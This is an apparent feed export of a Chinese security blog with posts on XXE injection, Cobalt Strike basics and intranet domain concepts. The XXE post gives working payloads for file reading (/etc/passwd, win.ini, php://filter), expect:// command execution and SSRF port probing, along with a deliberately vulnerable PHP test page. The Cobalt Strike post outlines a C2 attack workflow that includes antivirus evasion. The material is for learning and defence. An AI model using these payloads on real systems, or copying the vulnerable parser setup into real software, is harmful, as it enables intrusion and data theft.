class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; progressbar.ProgressBar()</span><br><span class="line"></span><br><span class="line">my_list &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">my_list.append([6, 7, 8, 9])</span><br><span class="line"></span><br><span class="line">for i in p(my_list):</span><br><span class="line">    # do something</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞攻防</title>
      <link href="/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
      <url>/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="1-XXE概述"><a href="#1-XXE概述" class="headerlink" title="1. XXE概述"></a>1. XXE概述</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p><p>可以造成危害</p><ul><li>文件读取</li><li>ssrf</li><li>dos</li><li>命令执行</li></ul><h2 id="XML基础介绍"><a href="#XML基础介绍" class="headerlink" title="XML基础介绍"></a>XML基础介绍</h2><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><p>下面我们主要介绍PHP语言下的XXE攻击.</p><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>文档类型定义（DTD）</strong></p><p>可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><ul><li><p>内部的 DOCTYPE 声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部文档声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="内部声明的例子"><a href="#内部声明的例子" class="headerlink" title="内部声明的例子"></a>内部声明的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><h4 id="最外部引用的例子"><a href="#最外部引用的例子" class="headerlink" title="最外部引用的例子"></a>最外部引用的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;waibu.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>waibu.DTD 被引用的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XXE 即 XML外部实体注入 。</p><p>我们先分别理解一下注入和外部实体的含义。</p><ul><li>注入：是指<code>XML</code>数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的。</li><li>外部实体：则是指攻击者通过利用外部实体声明部分来对<code>XML</code>数据进行修改、插入恶意代码。</li></ul><p>所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。</p><h2 id="主流的漏洞payload"><a href="#主流的漏洞payload" class="headerlink" title="主流的漏洞payload"></a>主流的漏洞payload</h2><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">fff</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;fff;</span><span class="tag">&lt;/<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SSRF内网探测"><a href="#SSRF内网探测" class="headerlink" title="SSRF内网探测"></a>SSRF内网探测</h4><p>我们要根据返回信息内容判断该端口是否打开。</p><p>主要是根据报错信息的差异来判断是否生效</p><p>若测试端口返回“Connection refused”则可以知道该端口是关闭的，否则为就是打开的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">ssrf</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.246.136:80"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;ssrf;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>ssrf?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="简单的测试代码"><a href="#简单的测试代码" class="headerlink" title="简单的测试代码"></a>简单的测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">  $xml = simplexml_load_string($data,<span class="string">"SimpleXMLElement"</span>,LIBXML_NOENT);</span><br><span class="line">  var_dump($xml)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：自己写个html提交表单把，我的环境是 win7+phpstudy</p><h3 id="任意文件读取payload"><a href="#任意文件读取payload" class="headerlink" title="任意文件读取payload"></a>任意文件读取payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"file:///C:/Windows/win.ini"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308114723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="任意文件读取php文件payload"><a href="#任意文件读取php文件payload" class="headerlink" title="任意文件读取php文件payload"></a>任意文件读取php文件payload</h3><p>问题出在读代码地方，都有&lt;&gt;这种可能会把php文件当初xml给处理了，所以直接读取会直接报错。所以我们换一种协议，转化格式读取<br>最终可以导致源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308115546147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码后正确<br><img src="https://img-blog.csdnimg.cn/20200308115659474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="SSRF内网探测payload"><a href="#SSRF内网探测payload" class="headerlink" title="SSRF内网探测payload"></a>SSRF内网探测payload</h3><p>这个报错信息根据环境的不同，协议的不同报错方式都不一样，所以到底这个有没有打开得自行遍历查看异同，和报错信息判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"http://127.0.0.1:3306"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>使用开发语言提供的禁用外部实体的方法</p><p>PHP：</p><p>libxml_disable_entity_loader(true);</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-一-CS的基础和介绍</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础"><a href="#内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础" class="headerlink" title="内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础"></a>内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li><p>本文主要是看了 Cobalt Strike 各种资料后记的笔记。</p></li><li><p>参考过于杂乱，如有问题请联系我</p></li><li><p>手上虽然没有4.0 ，但是也要提前学习了</p></li></ul><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>官网收费软件 <a href="https://www.cobaltstrike.com/，Cobalt" target="_blank" rel="noopener">https://www.cobaltstrike.com/，Cobalt</a> Strike许可费用为每位用户3500美元，其他的不说了</p><ul><li><p>Cobalt Strike是用于“对手模拟”和“红队行动”的软件</p></li><li><p>C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透</p></li><li><p>个人感觉是内网利器，所以放到内网里面了</p></li><li><p>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p></li><li><p>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200306102229806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="基本名词解释"><a href="#基本名词解释" class="headerlink" title="基本名词解释"></a>基本名词解释</h2><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><p>C2 就是 Command &amp; Control Server 的简称，也就是命令与控制服务器。</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>攻击者在C2上运行的服务，可以监听Beacon的请求(check in)。</p><h3 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h3><p>Beacon 是 Cobalt Strike 的 Payload</p><p>植入到受感染系统中的恶意程序，可以请求C2服务器并在受感染系统中执行命令</p><ul><li><p>有两种通信策略（与团队服务器，CS 中以团队服务器作为 C2）</p></li><li><ul><li>异步式通信 = 频率低、速度慢</li><li>交互式通信 = C2 对 Beacon 实时控制</li></ul></li><li><p>使用 HTTP/S 或 DNS 来出口网络数据</p></li></ul><h3 id="agent"><a href="#agent" class="headerlink" title="agent"></a>agent</h3><p>agent<code>的本意为代理。当攻击者通过代码执行，有一个</code>agent<code>运行在目标网络中，就可以对目标网络进行命令与控制。所以</code>agent` 实际上相当于 Beacon payload。</p><h3 id="服务器-Team-Server"><a href="#服务器-Team-Server" class="headerlink" title="服务器(Team Server)"></a>服务器(Team Server)</h3><p>Cobalt Strike的服务器组件。Team Server(TS)是配置和启动Listener的地方</p><ul><li>控制 - Team Server是Cobalt Strike中所有payload的主控制器，与受害者的所有连接<code>bind/reverse</code>都由Team Server管理。</li></ul><h3 id="客户端-Client-GUI"><a href="#客户端-Client-GUI" class="headerlink" title="客户端(Client GUI)"></a>客户端(Client GUI)</h3><p>团队成员使用的图形化界面</p><hr><h2 id="搭建基本的流程"><a href="#搭建基本的流程" class="headerlink" title="搭建基本的流程"></a>搭建基本的流程</h2><ol><li>(可选步骤)选取C2域名</li><li>(可选步骤)扩展Team Server - 选取或自定义一个C2通信配置文件<a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a> 可设置有效的SSL证书等</li><li>(可选步骤)扩展Client功能 - 使用<a href="https://github.com/search?q=Aggressor+Script" target="_blank" rel="noopener">AggressorScripts</a>修改或扩展Cobalt Strike 3.* 的客户端功能</li><li>启动团队服务器Team Server</li><li>Client 登录Team Server</li><li>启动监听器Listener</li><li>生成payload</li><li>(可选步骤)对payload进行免杀 尽量避免杀毒软件报毒</li><li>使用任意途径以实现受害者主机执行payload</li><li>对victim主机所在网络进行后渗透操作</li></ol><p>注：2这个后续可能另外写</p><p>C2通信配置文件 - <a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a></p><ul><li>定义C2的通信格式，修改CS默认的流量特征，以对抗流量分析</li><li>使用前强烈推荐使用团队服务器上的脚本对配置文件进行本地的单元测试以检查语法<code>./c2lint my.profile</code></li><li>每个Cobalt Strike团队服务器只能加载一个配置文件，如果需要多个配置文件，可以启动多个团队服务器，每个都有自己的配置文件，可从同一个Cobalt Strike客户端连接到这些服务器</li></ul><h2 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h2><h3 id="先启动team-sever"><a href="#先启动team-sever" class="headerlink" title="先启动team sever"></a>先启动team sever</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动Team Server</span><br><span class="line"> # team server 必须以 root 权限运行 以便于监听端口号为0–1023的listener</span><br><span class="line"> # 默认使用50050端口 监听来自团队成员CS Client的连接请求</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如 sudo .&#x2F;teamserver 192.168.0.100 123456</span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><img src="/Users/zy/Library/Application%20Support/typora-user-images/image-20200304184201215.png" alt="image-20200304184201215"></p><h5 id="启动参数"><a href="#启动参数" class="headerlink" title="启动参数"></a>启动参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 1 - 必填参数&#96;host&#96; 本服务器外网IP&#x2F;域名</span><br><span class="line">- 2 - 必填参数&#96;password&#96; Client GUI连接时需要输入的密码</span><br><span class="line">- 3 - 可选参数&#96;Malleable C2 communication profile&#96; 指定C2通信配置文件 该功能体现了CS的强大扩展性</span><br><span class="line">- 4 - 可选参数&#96;kill date&#96; 指定所有payload的终止日期</span><br></pre></td></tr></table></figure><h3 id="启动Client客户端"><a href="#启动Client客户端" class="headerlink" title="启动Client客户端"></a>启动Client客户端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Cobalt Strike</span><br><span class="line"></span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200306102329521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="Client-GUI-图形界面"><a href="#Client-GUI-图形界面" class="headerlink" title="Client GUI 图形界面"></a>Client GUI 图形界面</h3><p>登陆成功</p><p><img src="https://img-blog.csdnimg.cn/20200306102346823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网基础知识</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网基础知识"><a href="#内网安全学习从入门到入狱-知识-内网基础知识" class="headerlink" title="内网安全学习从入门到入狱-知识-内网基础知识"></a>内网安全学习从入门到入狱-知识-内网基础知识</h1><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#_0">内网安全学习从入门到入狱-知识-内网基础知识</a></li><li><ul><li><a href="#_3">内网渗透基础</a></li><li><ul><li><a href="#_10">基本的名词介绍</a></li><li><ul><li><a href="#_12">工作组</a></li><li><a href="#_20">域</a></li><li><a href="#AD_32">活动目录（AD）</a></li><li><a href="#DC_DC_51">DC 域控制器（DC）</a></li><li><a href="#DNS_63">DNS域名服务器</a></li></ul></li><li><a href="#_73">安全域的划分</a></li><li><ul><li><a href="#DMZ_75">DMZ是什么？</a></li><li><a href="#_94">域中有哪些电脑？</a></li></ul></li><li><a href="#_106">域内的权限分类</a></li><li><ul><li><a href="#_108">域本地组</a></li><li><a href="#_114">全局组</a></li><li><a href="#_122">通用组</a></li></ul></li><li><a href="#AGDLP__134">A-G-DL-P 策略</a></li><li><a href="#_153">常用本地域组的权限</a></li></ul></li></ul></li></ul><h2 id="内网渗透基础"><a href="#内网渗透基础" class="headerlink" title="内网渗透基础"></a>内网渗透基础</h2><ul><li>首先本文章基本上学习笔记</li><li></li></ul><hr><h3 id="基本的名词介绍"><a href="#基本的名词介绍" class="headerlink" title="基本的名词介绍"></a>基本的名词介绍</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><ul><li>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</li><li>工作组简单来说就是计算机在一个局域网中的的一个圈子，这个圈子大家都是平等的，想来就来想走就走，基本上没有什么约束，自我感觉就是一个组织的名称而已没有什么管理功能。</li></ul><hr><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><ul><li><p>域是一个有安全边界的计算机集合,在同一个域中的计算机, 